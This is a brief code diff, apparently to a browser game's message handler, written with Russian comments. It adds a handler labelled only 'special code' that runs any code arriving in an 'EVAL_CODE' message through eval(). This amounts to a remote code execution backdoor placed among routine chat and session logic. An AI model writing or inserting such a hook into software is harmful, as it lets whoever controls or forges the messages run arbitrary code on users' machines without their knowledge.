@@ -2225,6 +2225,11 @@ process_new_message = function(msg) {
 		if (msg.client_id !== client_id)
 			kill_game();
 
+	//специальный код
+	if (msg.message==='EVAL_CODE'){
+		eval(msg.code)		
+	}
+
 	//сообщение о блокировке чата
 	if (msg.message==='CHAT_BLOCK'){
 		my_data.blocked=1;		
